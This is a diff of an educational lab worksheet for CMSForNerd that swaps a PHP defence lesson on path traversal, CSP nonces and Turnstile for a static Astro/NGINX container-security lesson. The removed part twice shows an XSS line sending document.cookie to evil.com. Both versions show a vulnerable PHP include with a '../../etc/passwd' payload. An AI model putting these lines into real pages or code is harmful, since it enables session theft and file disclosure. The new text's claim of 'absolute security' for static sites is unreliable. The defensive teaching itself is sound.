@@ -1,255 +1,115 @@
 ---
 okf_version: 0.1
 type: content_page
-title: "Lab Worksheet: Module 3 - CmsForNerd v3.5"
-description: "Module 3: Defensive Engineering. Learn Path Traversal defense, CSP Nonces, and Bot Protection."
+title: "Lab Worksheet: Module 3 - CMSForNerd2"
+description: "Module 3: Defensive Engineering in Static Architectures. Learn how Astro 7.1 and unprivileged containers eliminate runtime security risks."
 schemaType: "WebPage"
 author: "CMSForNerd Team & Google Gemini"
 timestamp: "2026-07-30T12:00:00Z"
-topics: ["modernisation", "astro", "static", "php", "architecture"]
+topics: ["modernisation", "astro", "static", "architecture"]
 ---
 
 <article class="lab-worksheet">
 <h1>Student Lab Worksheet: Module 3</h1>
-<p class="subtitle">Topic: Defensive Engineering & Perimeter Security</p>
+<p class="subtitle">Topic: Defensive Static Engineering & Container Security</p>
 
 <div class="requirement-alert">
-<strong>Requirement Level:</strong> Students <strong>MUST</strong> successfully implement a "Level 2" CSP and secure the file loader to achieve "Green-Light" status.
+<strong>Requirement Level:</strong> Students <strong>MUST</strong> verify NGINX header configurations and secure static page outputs to achieve a secure "Green-Light" status.
 </div>
 
 <section class="objectives">
 <h2>🎯 Learning Objectives</h2>
 <ul>
-<li>Understand <strong>Defense-in-Depth</strong> strategies.</li>
-<li>Eliminate <strong>Path Traversal</strong> vulnerabilities using allowlist sanitization.</li>
-<li>Configure a <strong>Content Security Policy (CSP)</strong> to neutralize XSS.</li>
-<li>Implement <strong>Bot Defense</strong> using Cloudflare Turnstile.</li>
+<li>Understand how **Static-Site Generation (SSG)** completely eliminates server-side vulnerabilities.</li>
+<li>Implement strict **Content Security Policies (CSP)** for statically compiled resources.</li>
+<li>Understand the secure design of **Unprivileged NGINX Containers** running on non-root ports.</li>
 </ul>
 </section>
 
 <section class="step">
-<h2>🧱 Step 1: The "Defense-in-Depth" Concept</h2>
-<p>Security is like an onion. If one layer fails, another must catch the attacker. In CmsForNerd, we use three primary layers:</p>
-<ol>
-<li><strong>The Code Layer:</strong> Sanitizing inputs (e.g., using <code>SecurityUtils</code>).</li>
-<li><strong>The Browser Layer:</strong> Using CSP to tell the browser what scripts to trust.</li>
-<li><strong>The Network Layer:</strong> Using Turnstile to block automated bots.</li>
-</ol>
-</section>
+<h2>🧱 Step 1: The "Static Immunity" Concept</h2>
+<p>In traditional PHP applications, every request executes code on the server, opening up possibilities for <strong>Path Traversal (../)</strong>, <strong>Local File Inclusion (LFI)</strong>, and <strong>SQL Injection</strong>.</p>
 
-<section class="step">
-<h2>🧪 Step 2: Input Hardening (Path Traversal)</h2>
-<p>In legacy versions of CMSForNerd, the code was vulnerable to <strong>Dot-Dot-Slash (../)</strong> attacks:</p>
-<div class="code-block legacy">
-<pre><code>// VULNERABLE CODE - DO NOT USE
+<div class="comparison-grid">
+<div class="vulnerable-code" style="border-left-color: #dc3545;">
+<h4>❌ Legacy Dynamic Controller (PHP)</h4>
+<pre><code>// VULNERABLE TO PATH TRAVERSAL
 $page = $_GET['page'];
 include "contents/" . $page . ".php";</code></pre>
+<p class="danger">Attacker can load system files by passing "?page=../../etc/passwd"!</p>
 </div>
-<p><strong>Exercise:</strong> Open <code>includes/SecurityUtils.php</code> and ensure <code>sanitizePageName()</code> is used in <code>index.php</code> to neutralize non-alphanumeric characters.</p>
-<div class="code-block modern">
-<pre><code>public static function sanitizePageName(string $pageName): string
-{
-// MUST: Only allow alphanumeric characters and hyphens.
-return preg_replace('/[^a-zA-Z0-9\-]/', '', $pageName);
-}</code></pre>
+
+<div class="secure-code" style="border-left-color: #28a745;">
+<h4>✅ Astro 7.1 Static Modernisation</h4>
+<pre><code>// Pre-compiled statically at build time
+// No runtime URL routing logic is executed on the host
+// Built file: dist/about/index.html</code></pre>
+<p class="success">Absolute security! The server only hosts static HTML files. No backend code execution!</p>
+</div>
 </div>
 </section>
 
 <section class="step">
-<h2>🛡️ Step 3: CSP Nonces - Google-Grade XSS Protection</h2>
-<p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy with nonces</strong> can block its execution.</p>
+<h2>🛡️ Step 2: Content Security Policy on Static Sites</h2>
+<p>For a static site, security relies heavily on the web server headers. We configure our strict Content Security Policy directly within the web server configuration file.</p>
 
 <div class="concept-box">
-<h3>What is a Nonce?</h3>
-<p>A <strong>nonce</strong> (number used once) is a cryptographically random string generated for each page load.
-Only scripts with this exact nonce are allowed to execute.</p>
+<h3>Why Static CSP Headers?</h3>
+<p>A static web server like NGINX can append HTTP headers to every served file. By enforcing a strict CSP, we tell the visitor's browser exactly which domains are trusted to load script, font, and style assets.</p>
 </div>
 
-<h3>📋 Task 3.1: Understand the Implementation</h3>
-<p>Study how CMSForNerd implements CSP nonces across three critical files:</p>
-
-<div class="file-study">
-<h4>File 1: includes/SecurityUtils.php</h4>
-<p>Open this file and find the <code>generateNonce()</code> method:</p>
+<h3>📋 Task 2.1: Review the NGINX Security configuration</h3>
+<p>Open <code>nginx/default.conf</code> and locate the security headers section. Notice how we restrict script and style domains to maintain standard compliance:</p>
 <div class="code-block modern">
-<pre><code>public static function generateNonce(): string
-{
-// Generate a 128-bit (16-byte) random nonce
-return base64_encode(random_bytes(16));
-}</code></pre>
-</div>
-<p><strong>Question:</strong> Why do we use <code>random_bytes(16)</code> instead of <code>rand()</code>?</p>
-<p class="answer-hint">💡 Click to reveal: <code>random_bytes()</code> is cryptographically secure (unpredictable), while <code>rand()</code> is predictable and can be cracked.</p>
-</div>
-
-<div class="file-study">
-<h4>File 2: includes/CmsContext.php</h4>
-<p>Find where the nonce is stored:</p>
-<div class="code-block modern">
-<pre><code>public string $cspNonce;
-
-public function __construct(
-// ... parameters
-?string $cspNonce = null,
-) {
-$this->cspNonce = $cspNonce ?? SecurityUtils::generateNonce();
-}</code></pre>
-</div>
-<p><strong>Task:</strong> Add a <code>var_dump($ctx->cspNonce);</code> in <code>index.php</code> to see the nonce. Reload the page multiple times - does it change?</p>
-</div>
-
-<div class="file-study">
-<h4>File 3: contents/common-headertag.inc</h4>
-<p>Locate the CSP header and script tags:</p>
-<div class="code-block modern">
-<pre><code>&lt;meta http-equiv="Content-Security-Policy"
-content="script-src 'self' 'nonce-&lt;?= $ctx-&gt;cspNonce ?&gt;' ..."&gt;
-
-&lt;script type="application/ld+json" nonce="&lt;?= $ctx-&gt;cspNonce ?&gt;"&gt;
-{/* JSON-LD data */}
-&lt;/script&gt;</code></pre>
-</div>
-</div>
-
-<h3>🧪 Task 3.2: The XSS Attack Simulation</h3>
-<p><strong>Scenario:</strong> An attacker injects malicious JavaScript into your page.</p>
-
-<div class="comparison-grid">
-<div class="vulnerable-code">
-<h4>❌ Without CSP Nonce (Vulnerable)</h4>
-<div class="code-block legacy">
-<pre><code>&lt;!-- Legitimate script --&gt;
-&lt;script&gt;
-console.log("Normal operation");
-&lt;/script&gt;
-
-&lt;!-- ATTACKER INJECTED THIS! --&gt;
-&lt;script&gt;
-document.location='http://evil.com?cookie='+document.cookie;
-&lt;/script&gt;</code></pre>
-</div>
-<p class="danger">🚨 Both scripts execute! User cookies stolen!</p>
-</div>
-
-<div class="secure-code">
-<h4>✅ With CSP Nonce (Secure)</h4>
-<div class="code-block modern">
-<pre><code>&lt;!-- Legitimate script with nonce --&gt;
-&lt;script nonce="dGhpc2lzYXJhbmRvbQ=="&gt;
-console.log("Normal operation");
-&lt;/script&gt;
-
-&lt;!-- ATTACKER INJECTED THIS! --&gt;
-&lt;script&gt;
-document.location='http://evil.com?cookie='+document.cookie;
-&lt;/script&gt;</code></pre>
-</div>
-<p class="success">✅ Only first script runs! Injected script blocked by CSP!</p>
-</div>
-</div>
-
-<h3>🔬 Live Challenge: Attack Your Own Site!</h3>
-<ol>
-<li>Open your browser's DevTools (<kbd>F12</kbd>)</li>
-<li>Go to the <strong>Console</strong> tab</li>
-<li>Try to inject a script:
-<div class="code-block">
-<pre><code>var script = document.createElement('script');
-script.textContent = 'alert("I hacked you!");';
-document.body.appendChild(script);</code></pre>
-</div>
-</li>
-<li><strong>Expected Result:</strong> You should see an error:
-<div class="console-output">
-<pre>❌ Refused to execute inline script because it violates the following
-   Content Security Policy directive: "script-src 'self' 'nonce-XXXXX'".</pre>
-</div>
-</li>
-</ol>
-
-<p><strong>Full Guide:</strong> For a comprehensive tutorial with best practices, see the
-<a href="/csp-nonce-guide" class="guide-link">🛡️ CSP Nonce Implementation Guide</a></p>
-</section>
-
-<section class="step">
-<div class="code-block html">
-<pre><code>&lt;meta http-equiv="Content-Security-Policy" content="
-default-src 'self';
-script-src 'self' https://challenges.cloudflare.com;
-style-src 'self' 'unsafe-inline';
-"&gt;</code></pre>
+<pre><code># Enforcing security headers directly from NGINX
+add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src 'self' https://challenges.cloudflare.com; object-src 'none'; base-uri 'self';" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;</code></pre>
 </div>
 </section>
 
 <section class="step">
-<h2>🤖 Step 4: Hybrid Security - Bot Intel & Turnstile</h2>
-<p>In v3.5, we implement a <strong>Hybrid Security</strong> approach to handle automated traffic. We distinguish between "Good Bots" (Search Engines) and "Bad Bots" (Spammers).</p>
+<h2>🐳 Step 3: Hardened Containerisation</h2>
+<p>For deployment on Render.com, we package CMSForNerd2 using a multi-stage unprivileged Docker build.</p>
+<div class="file-study">
+<h4>Multi-stage Containerfile/Dockerfile Configuration</h4>
+<p>Notice how our build process compiling Astro 7.1 separates the build tools from the final NGINX container:</p>
+<div class="code-block modern">
+<pre><code># Stage 1: Build the static files
+FROM node:20-alpine AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm install --legacy-peer-deps
+COPY . .
+RUN npm run build
 
-<div class="comparison-grid">
-<div class="vulnerable-code" style="border-left-color: #007bff;">
-<h4>🔍 Good Bots: Bot Intelligence</h4>
-<p>Ensures SEO crawlers are recognized and served correctly.</p>
-<ul>
-<li><strong>Location:</strong> <code>includes/is_bot.php</code></li>
-<li><strong>Trigger:</strong> Active on every request (GET/POST).</li>
-<li><strong>Command:</strong> Run <code>composer update-bots</code> to sync verified IP ranges.</li>
-</ul>
+# Stage 2: Serve using hardened unprivileged NGINX
+FROM nginx:alpine-slim
+COPY --from=builder /app/dist /usr/share/nginx/html
+# Run NGINX on non-root port 8080 as unprivileged user
+...</code></pre>
 </div>
-
-<div class="secure-code" style="border-left-color: #dc3545;">
-<h4>🛑 Bad Bots: Turnstile</h4>
-<p>Blocks automated form submissions and brute-force attacks.</p>
-<ul>
-<li><strong>Location:</strong> <code>includes/turnstile.php</code></li>
-<li><strong>Trigger:</strong> Automatically active on all <strong>POST</strong> requests.</li>
-<li><strong>Integration:</strong> Requires a widget in your forms.</li>
-</ul>
+<p><strong>Question:</strong> Why do we run the container on port <code>8080</code> instead of port <code>80</code>?</p>
+<p class="answer-hint">💡 Click to reveal: Standard ports like 80 require root privileges, whereas port 8080 allows the web server to execute as a secure, unprivileged user, mitigating potential container breakout risks.</p>
 </div>
-</div>
-
-<h3>📋 Task 4.1: Synchronize Bot Intelligence</h3>
-<p>Open your terminal and run the following command to populate your "Trust Database":</p>
-<div class="terminal-block"><code>composer update-bots</code></div>
-<p>This fetches the latest verified IP addresses for Google and Bing from their official endpoints.</p>
-
-<h3>📋 Task 4.2: Integrate the Turnstile Widget</h3>
-<p>Add the following code to any form to enable human verification:</p>
-<ol>
-<li>Add the API script to your <code>&lt;head&gt;</code>:
-<div class="code-block html"><code>&lt;script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer&gt;&lt;/script&gt;</code></div>
-</li>
-<li>Place the widget inside your <code>&lt;form&gt;</code>:
-<div class="code-block html"><code>&lt;div class="cf-turnstile" data-sitekey="your-site-key"&gt;&lt;/div&gt;</code></div>
-</li>
-</ol>
 </section>
 
 <section class="step">
-<h2>✅ Step 5: The "Attack & Defend" Audit</h2>
-
-<h3>5.1: Programmatic Defense</h3>
-<p>Run the test suite to verify Path Traversal protection:</p>
-<div class="terminal-block"><code>./vendor/bin/phpunit --filter it_prevents_directory_traversal_attacks</code></div>
-
-<h3>5.2: Perimeter Testing</h3>
-<ol>
-<li>Try to inject an external image: <code>&lt;img src="http://evil.com/trap.jpg"&gt;</code>.</li>
-<li><strong>Result:</strong> Open Browser Console (F12). You <strong>MUST</strong> see a CSP error.</li>
-</ol>
-
-<div class="question-box">
-<p><strong>Question for the Student:</strong> Why is a CSP considered a "Fail-Safe" for XSS vulnerabilities?</p>
-<p class="hint">(Hint: What happens if you forget to use <code>escapeHtml()</code> on a user comment?)</p>
+<h2>✅ Step 4: Verification (The "Security" Audit)</h2>
+<p>Run a preview of your static compiled container and audit your NGINX headers using curl:</p>
+<div class="terminal-block">
+<code>curl -I http://localhost:8080/healthz</code>
 </div>
+<p><strong>Expected Outcome:</strong> The response must return an HTTP status of <code>200 OK</code> along with your strict Content-Security-Policy and X-Frame-Options security headers.</p>
 </section>
 
 <footer class="standards-summary">
-<h2>🎓 Summary of RFC 2119 Standards for Module 3</h2>
+<h2>🎓 Summary of Standards for Module 3</h2>
 <ul>
-<li><strong>MUST:</strong> All external assets (scripts/fonts) <strong>MUST</strong> be explicitly allowed in the CSP.</li>
-<li><strong>MUST:</strong> Use <code>preg_replace</code> to strip non-alphanumeric characters from file paths.</li>
-<li><strong>SHOULD:</strong> Avoid using <code>'unsafe-inline'</code> in your CSP whenever possible.</li>
-<li><strong>MUST NOT:</strong> Use the <code>http://</code> protocol for external resources; only <strong>https://</strong> is permitted.</li>
+<li><strong>MUST:</strong> Deliver all files over HTTPS or secure local network pathways.</li>
+<li><strong>MUST:</strong> Enforce strict Content Security Policies via static server headers.</li>
+<li><strong>MUST NOT:</strong> Run web server serving processes as the root system user.</li>
 </ul>
 </footer>
 
@@ -279,9 +139,6 @@ style-src 'self' 'unsafe-inline';
 .lab-worksheet .danger { color: #dc3545; font-weight: bold; }
 .lab-worksheet .success { color: #28a745; font-weight: bold; }
 .lab-worksheet .console-output { background: #2d2d2d; color: #f8f8f2; padding: 1rem; border-radius: 4px; margin: 0.5rem 0; }
-.lab-worksheet kbd { background: #333; color: #fff; padding: 0.2rem 0.5rem; border-radius: 3px; font-family: monospace; font-size: 0.9rem; }
-.lab-worksheet .guide-link { display: inline-block; background: #c7254e; color: white; padding: 0.5rem 1rem; text-decoration: none; border-radius: 4px; margin: 1rem 0; }
-.lab-worksheet .guide-link:hover { background: #a02040; }
 .progress-nav { display: flex; justify-content: space-between; margin-top: 3rem; padding: 2rem 0; border-top: 2px solid #eee; }
 .progress-nav .btn { padding: 1rem 1.5rem; border-radius: 4px; text-decoration: none; font-weight: bold; }
 .progress-nav .prev { background: #6c757d; color: #fff; }
